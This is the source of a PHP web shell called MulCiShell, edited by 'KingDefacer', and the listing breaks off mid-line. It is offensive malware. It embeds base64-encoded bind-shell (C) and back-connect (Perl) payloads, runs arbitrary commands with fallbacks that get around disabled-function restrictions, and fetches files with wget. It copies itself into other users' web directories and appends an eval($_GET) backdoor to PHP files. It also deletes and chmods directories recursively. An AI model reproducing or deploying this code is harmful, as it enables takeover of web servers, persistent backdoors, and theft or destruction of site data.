<?php
#/\/\/\/\/\  MulCiShell v0.2 - Edited By KingDefacer/\/\/\/\/\/\/\#
# Updates from version 1.0#
# 1) Fixed MySQL insert function
# 2) Fixed trailing dirs
# 3) Fixed file-editing when set to 777
# 4) Removed mail function (who needs it?)
# 5) Re-wrote & improved interface
# 6) Added actions to entire directories
# 7) Added config+forum finder
# 8) Added MySQL dump function
# 9) Added DB+table creation, DB drop, table delete, and column+table count
# 10) Updated security-info feature to include more useful details
# 11) _Greatly_ Improved file browsing and handling
# 12) Added banner
# 13) Added DB-Parser and locator
# 14) Added enumeration function
# 15) Added common functions for bypassing security restrictions
# 16) Added bindshell & backconnect (needs testing)
# 17) Improved command execution (alts)
#/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/#
@ini_set("memory_limit","256M");
@set_magic_quotes_runtime(0);
session_start();
ob_start();
$start=microtime();
if(isset($_GET['theme'])) $_SESSION['theme']=$_GET['theme'];
//Thanks korupt ;)
$backdoor_c="DQojaW5jbHVkZSA8YXNtL2lvY3Rscy5oPg0KI2luY2x1ZGUgPHN5cy90aW1lLmg+DQojaW5jbHVkZSA8c3lzL3NlbGVjdC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHB0aHJlYWQuaD4NCg0Kdm9pZCAqQ2xpZW50SGFuZGxlcih2b2lkICpjbGllbnQpDQp7DQoJaW50IGZkID0gKGludCljbGllbnQ7DQoJZHVwMihmZCwgMCk7DQoJZHVwMihmZCwgMSk7DQoJZHVwMihmZCwgMik7DQoJaWYoZm9yaygpID09IDApDQoJCWV4ZWNsKCIvYmluL2Jhc2giLCAicmVzbW9uIiwgMCk7DQoJY2xvc2UoZmQpOw0KCXJldHVybiAwOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KCWludCBtc29jaywgY3NvY2ssIGkgPSAxOw0KCXB0aHJlYWRfdCB0aHJlYWQ7DQoJc3RydWN0IHNvY2thZGRyIHNhZGRyOw0KCXN0cnVjdCBzb2NrYWRkcl9pbiBzYWRkckluOw0KICAgIGludCBwb3J0PWF0b2koYXJndlsxXSk7DQoJaWYoKG1zb2NrID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCkpID09IC0xKQ0KCQlyZXR1cm4gLTE7DQoNCglzYWRkckluLnNpbl9mYW1pbHkJCT0gQUZfSU5FVDsNCglzYWRkckluLnNpbl9hZGRyLnNfYWRkcgk9IElOQUREUl9BTlk7DQoJc2FkZHJJbi5zaW5fcG9ydAkJPSBodG9ucyhwb3J0KTsNCiAgIA0KCW1lbWNweSgmc2FkZHIsICZzYWRkckluLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyX2luKSk7DQoJc2V0c29ja29wdChtc29jaywgU09MX1NPQ0tFVCwgU09fUkVVU0VBRERSLCAoY2hhciAqKSZpLCBzaXplb2YoaSkpOw0KIA0KCWlmKGJpbmQobXNvY2ssICZzYWRkciwgc2l6ZW9mKHNhZGRyKSkgIT0gMCl7DQoJCWNsb3NlKG1zb2NrKTsNCgkJcmV0dXJuIC0xOw0KCX0NCiANCglpZihsaXN0ZW4obXNvY2ssIDEwKSA9PSAtMSl7DQoJCWNsb3NlKG1zb2NrKTsNCgkJcmV0dXJuIC0xOw0KCX0NCiANCgl3aGlsZSgxKXsNCgkJaWYoKGNzb2NrID0gYWNjZXB0KG1zb2NrLCBOVUxMLCBOVUxMKSkgIT0gLTEpew0KCQkJcHRocmVhZF9jcmVhdGUoJnRocmVhZCwgMCwgaGFuZGxlciwgKHZvaWQgKiljc29jayk7DQoJCX0NCgl9DQoJDQoJcmV0dXJuIDE7DQp9"; 
$backconnect_perl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KbXkgKCRpYWRkciwkcG9ydCwkY21kKT1AQVJHVjsNCm15ICRwYWRkcj1zb2NrYWRkcl9pbigkcG9ydCwgaW5ldF9hdG9uKCRpYWRkcikpOw0KbXkgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoInRjcCIpOw0Kc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90byk7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERJTiwiPiZTT0NLRVQiKTsNCnByaW50IFNPQ0tFVCAiU2hlbGwgdGVzdFxuIjsNCnByaW50IGV4ZWMoJGNtZCk7DQpjbG9zZShTVERJTik7DQpjbG9zZShTVERPVVQpOw0K";
$pl_scan="DQoJIyEvdXNyL2Jpbi9wZXJsDQp1c2Ugd2FybmluZ3M7DQp1c2Ugc3RyaWN0Ow0KdXNlIGRpYWdub3N0aWNzOw0KdXNlIElPOjpTb2NrZXQ6OklORVQ7DQpzdWIgdXNhZ2UNCnsNCglkaWUoIiQwIGhvc3Qgc3RhcnRwb3J0IGVuZHBvcnQKIik7DQp9DQp1c2FnZSB1bmxlc3MoQEFSR1Y+MSk7DQpteSgkaG9zdCwkcywkZSk9QEFSR1Y7DQpmb3JlYWNoKCRzLi4kZSkNCnsNCglteSAkc29jaz1JTzo6U29ja2V0OjpJTkVULT5uZXcNCgkoDQoJCVBlZXJBZGRyPT4kaG9zdCwNCgkJUGVlclBvcnQ9PiRfLA0KCQlQcm90bz0+J3RjcCcsDQoJCVRpbWVvdXQ9PjINCgkpOw0KCXByaW50ICJQb3J0ICBvcGVuCiIgaWYgKCRcc29jayk7DQp9DQoNCgk=";
$access_control=0;
$md5_user="KingDefacer";
$md5_pass="123";
$user_agent="KingDefacer";
$allowed_addrs=array('127.0.0.1');
$shell_email="KingDefacer@msn.com";
$self=basename($_SERVER['PHP_SELF']);
$addr=$_SERVER['REMOTE_ADDR'];
$serv=@gethostbyname($_SERVER['HTTP_HOST']);
$soft=$_SERVER['SERVER_SOFTWARE'];
$safe_mode=(@ini_get("safe_mode")=='')?"OFF":"ON";
$open_basedir=(@ini_get("open_basedir")=='')?"OFF":"ON";
$uname=@php_uname();
$space=TrueSize(disk_free_space(realpath(getcwd())));
$total=TrueSize(disk_total_space(realpath(getcwd())));
$id=@execmd("id",$disable);
$int_paths=array("mybb","phpbb","phpbb3","forum","forums","board","boards","bb","discuss");
$inc_paths=array("includes","include","inc");
$sql_build_path;
echo "<script type=\"text/javascript\" language=\"javascript\">
function togglecheck() 
{
    var cb=document.forms[0].check
    for (i in cb) 
    {
        cb[i].checked=(cb[i].checked)?false:true;
    }
}
</script>";
switch($access_control) #Break statements intentionally ommited
{
    case 3:
    $ip_allwd=false;
    foreach($allowed_addrs as $addr) 
    {
        if($addr==$_SERVER['REMOTE_ADDR']) {$ip_allwd=true; break;}
        if(!$ip_allwd) exit;
    }
    case 2:
    if(!isset($_SERVER['PHP_AUTH_USER'])||$_SERVER['PHP_AUTH_USER']!=$md5_user||$_SERVER['PHP_AUTH_PW']!=$md5_pass)
    {
            header("WWW-Authenticate: Basic Realm=\"Restricted area\"");
            header("HTTP/1.1 401 Unauthorized");
            echo "Wrong username/password";
            exit;
    }
    case 1:
    if($_SERVER['HTTP_USER_AGENT']!=$user_agent) exit;
}
if($id) 
{
        $s=strpos($id,"(",0)+1;
        $e=strpos($id,")",$s);
        $idval=substr($id,$s,$e-$s);
}
$disable=@ini_get("disable_functions");
if(empty($disable)) $disable="None";
function rm_rep($dir,&$success,&$fail)
{
        @$dh=opendir($dir);
        if(is_resource($dh))
        {
        while((@$rm=readdir($dh)))
        {
            if($rm=='.' || $rm=='..') continue;
            if(is_dir($dir.'/'.$rm)) {echo "Deleting dir $dir/$rm...</br>"; rm_rep($dir.'/'.$rm,$success,$fail); continue;}
            if(@unlink($dir.'/'.$rm)) {$success++;echo "Deleted $rm...</br>";}
            else {$fail++; echo "Failed to delete $rm</br>";}
        }
        @closedir($dh);
    } else echo "Failed to open dir $dir</br>";
}
function chmod_rep($dir,&$success,&$fail,$mod_value)
{
        @$dh=opendir($dir);
        if(is_resource($dh))
        {
        while((@$ch=readdir($dh)))
        {
            if($ch=='.' || $ch=='..') continue;
            if(is_dir($dir.'/'.$ch)) {echo "Changing file modes in dir $dir/$ch...</br>"; chmod_rep($dir.'/'.$ch,$success,$fail,$mod_value); continue;}
            if(@chmod($dir.'/'.$ch,$mod_value)) {$success++;echo "Changed mode for $ch...</br>";}
            else {$fail++; echo "Failed to chmod $rm</br>";}
        }
        @closedir($dh);
    } else echo "Failed to open dir $dir</br>";
}
#Complete these functions
function spread_self($user,&$c=0,$d=0)
{
            if(!$d) $dir="/home/$user/public_html/"; 
            else $dir=$d;
            if(is_dir($dir)&&is_writable($dir))
            {
                copy(CleanDir(getcwd()).'/'.basename($_SERVER['PHP_SELF']),$dir.$f.'/mshell.php'); 
                echo "[+] Shell copied to $dir.$f./mshell.php</br>"; 
                $c++;
            }
            if(@$dh=opendir($dir)) echo "[-] Failed to open dir $dir</br>";
            while((@$f=readdir($dh)))
            {
                if($f!="."&&$f!="..")
                {
                    if(@is_dir($dir.$f)) 
                    {
                        echo "[+] Spreading to dir $dir</br>";
                        if(@is_writable($dir.$f))
                        {
                            copy(CleanDir(getcwd()).'/'.basename($_SERVER['PHP_SELF']),$dir.$f.'/mshell.php'); 
                            echo "[+] Shell copied to $dir.$f./mshell.php</br>"; 
                            $c++;
                        }
                        $c+=spread_self($user,$c,$dir.$f.'/');
                    }
                }
            }
}
function copy_rep($dir,&$c)
{

}
function backup_site()
{
    if(!isset($_POST['busite']))
    {
        echo "<center>The following tool will attempt to retrieve every file from the specified dir (including child dirs).</br>If successful, you will be prompted for a site backup download.</br><i>Note: Only readable files will be downloaded. Images and executables will be discarded. This tool should only be used in scenarios in which you have to quickly retrieve a site's source.</i></center>"; 
    }
}
function infect_rep($dir,&$success,&$fail)
{
}
function copy_dir($dir,$new_dir)
{
}
##################################
function execmd($cmd,$d_functions="None")
{
    if($d_functions=="None") {$ret=passthru($cmd); return $ret;}
    $funcs=array("shell_exec","exec","passthru","system","popen","proc_open");
    $d_functions=str_replace(" ","",$d_functions);
    $dis_funcs=explode(",",$d_functions);
    foreach($funcs as $safe)
    {
        if(!in_array($safe,$dis_funcs)) 
        {
            if($safe=="exec")
            {
                $ret=@exec($cmd);
                $ret=join("\n",$ret);
                return $ret;
            }
            elseif($safe=="system")
            {
                $ret=@system($cmd);
                return $ret;
            }
            elseif($safe=="passthru")
            {
                $ret=@passthru($cmd);
                return $ret;
            }
            elseif($safe=="shell_exec")
            {
                $ret=@shell_exec($cmd);
                return $ret;
            }
            elseif($safe=="popen")
            {
                $ret=@popen("$cmd",'r');
                if(is_resource($ret))
                {
                    while(@!feof($ret))
                    $read.=@fgets($ret);
                    @pclose($ret);
                    return $read;
                }
                return -1;
            }
            elseif($safe="proc_open")
            {
                $cmdpipe=array(
                0=>array('pipe','r'),
                1=>array('pipe','w')
                );
                $resource=@proc_open($cmd,$cmdpipe,$pipes);
                if(@is_resource($resource))
                {
                    while(@!feof($pipes[1]))
                    $ret.=@fgets($pipes[1]);
                    @fclose($pipes[1]);
                    @proc_close($resource);
                    return $ret;
                }
                return -1;
            }
        }
    }
    return -1;
}
$links=array("Enumerate"=>"$self?act=enum","Files"=>"$self?act=files","Domains"=>"$self?act=domains","MySQL"=>"$self?act=sql","Encoder"=>"$self?act=encode",
"Sec. Info"=>"$self?act=sec","Cracker"=>"$self?act=bf",
"Bypassers"=>"$self?act=bypass","Tools"=>"$self?act=tools","Databases"=>"$self?act=dbs","Backdoor Host"=>"$self?act=bh","Back Connect"=>"$self?act=backc","Spread Shell"=>"$self?act=spread","Kill Shell"=>"$self?act=kill");
    echo "<html><head><title>MulCiShell v2.0 - Edited By KingDefacer</title></head>";
    switch($_SESSION['theme'])
    {
        case 'green':
        echo "<style>
            body{color:#66FF00; font-size: 12px; font-family: serif; background-color: black;}
            td {border: 1px solid #00FF00; background-color:#001f00; padding: 2px; font-size: 12px; color: #33FF00;}
            td:hover{background-color: black; color: #33FF00;}
            input{background-color: black; color: #00FF00; border: 1px solid green;}
            input:hover{background-color: #006600;}
            textarea{background-color: black; color: #00FF00; border: 1px solid white;}
            a {text-decoration: none; color: #66FF00; font-weight: bold;}
            a:hover {color: #00FF00;}
            select{background-color: black; color: #00FF00;}
            #main{border-bottom: 1px solid #33FF00; padding: 5px; text-align: center;}
            #main a{padding-right: 15px; color:#00CC00; font-size: 12px; font-family: arial; text-decoration: none; }
            #main a:hover{color: #00FF00; text-decoration: underline;}
            #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
            </style>
            <body>";
        break;
        case 'dark':
            echo "<style>
            body{color: #FFFFFF; font-size: 12px; font-family: serif; background-color: #000000;}
            td {border: 1px solid #FFFFFF; background-color: #000000; padding: 2px; font-size: 12px; color: #FFFFFF;}
            input{background-color: black; color: #FFFFFF;; border: 1px solid #FFFFFF;}
            input:hover{background-color: #000099;}
            textarea{background-color: #000000; color: #FFFFFF; border: 1px solid white;}
            a {text-decoration: none; color: #FFFFFF; font-weight: bold;}
            a:hover {font-weight: bold;}
            select{background-color: #000000; color: #FFFFFF;}
            #main{border-bottom: 1px solid white; padding: 5px; text-align: center;}
            #main a{padding-right: 15px; color:#FFFFFF; font-size: 12px; font-family: arial; text-decoration: none; }
            #main a:hover{font-weight: bold;}
            #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
            </style><body>";
        break;
        default:
            echo "<style>
            body{color: white; font-size: 12px; font-family: arial; scrollbar-base-color:blue; scrollbar-arrow-color:yellow; scrollbar-face-color:blue; }
            td {border: 1px solid #000099; background-color: #000033; padding: 2px; font-size: 12px; color: white; }
            input{background-color: black; color: white; border: 1px solid #000066;}
            input:hover{background-color: #000066; border: 1px solid white;}
            td:hover {color: yellow; background: black;}
            textarea{background-color: #000033; color: white; border: 1px solid white;}
            a {text-decoration: none; color: white; font-weight: bold;}
            a:hover {color: yellow}
            select{background-color: black; color: white;}
            #main{border-bottom: 1px solid #0066FF; padding: 5px; text-align: center;}
            #main a{padding-right: 15px; color: white; font-size: 12px; font-family: arial; text-decoration: none; }
            #main a:hover{color: #0033FF; text-decoration: underline;}
            #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
            </style>
            <body bgcolor='black'>";
            break;
    }
    echo base64_decode("PGNlbnRlcjxpbWcgc3JjPSdodHRwOi8vaW1nNTI5LmltYWdlc2hhY2sudXMvaW1nNTI5LzExNjYv
bWlsY2lzaGVsbGxrNi5wbmcnPjwvY2VudGVyPg==");
echo "<table style='width: inherit; margin: auto; text-align: center;'>
<tr><td>Server IP</td><td>Your IP</td><td>Disk space</td><td>Safe_mode?</td><td>Open_BaseDir?</td><td>System</td><td>Server software</td><td>Disabled functions</td><td>ID</td><td>Shell location</td></tr>
<tr><td>$serv</td><td>$addr</td><td>$space of $total</td><td>$safe_mode</td><td>$open_basedir</td><td>$uname</td><td>$soft</td><td>$disable</td><td>$idval</td><td>".CleanDir(getcwd()).'/'.basename($_SERVER['PHP_SELF'])."</td></tr>
</table></br>
<div id='main'>";
foreach($links as $val=>$addr) echo "<a href='$addr'>[ $val ]</a>";
echo "</div><br>";
if(isset($_POST['encryption']))
{
    $e=$_POST['encrypt'];
    echo "<form action='$self?' method='post'><center><textarea rows='19' cols='75' readonly>MD5: ".md5($e)."\nSHA1: ".sha1($e)."\nCrypt: ".crypt($e)."\nCRC32: ".crc32($e)."\nBase64 Encoded: ".base64_encode($e)."\nBase64 decoded: ".base64_decode($e)."\nURL encode: ".urlencode($e)."\nURL decode: ".urldecode($e)."\nBin2Hex ".bin2hex($e)."\nDec2Hex: ".dechex($e)."</textarea><br><br>Input: <input type='text' style='width: 300px' name='encrypt'>
    <br><input type='submit' value='Encrypt' name='encryption'></center>";
}
if(isset($_POST['dogetfile']))
execmd("wget $_POST[wgetfile]",$disable);
if(isset($_POST['doUpload']))
{
    $dir=$_POST['u_location'];
    $name=$_FILES['u_file']['name'];
    switch($_FILES['u_file']['error'])
    {
        case 0:
        if(@move_uploaded_file($_FILES['u_file']['tmp_name'],$dir.'/'.$name))
        echo "File uploaded successfully<br>";
        else echo "Failed to upload file!";
    }
}
if(isset($_POST['massfiles']))
{
    $fail=0;
    $success=0;
    switch($_POST['fileaction'])
    {
        case 'Infect': #Nothing special here, just kick them while they're down
        foreach($_POST['files'] as $file)
        {
            $ext=strrchr($file,'.');
            if($ext!=".php") continue;
            @$fh=fopen($file,'a');
            if(@is_resource($fh))
            {
                $success++;
                @fwrite($fh,"<?php @eval(\$_GET['e']) ?>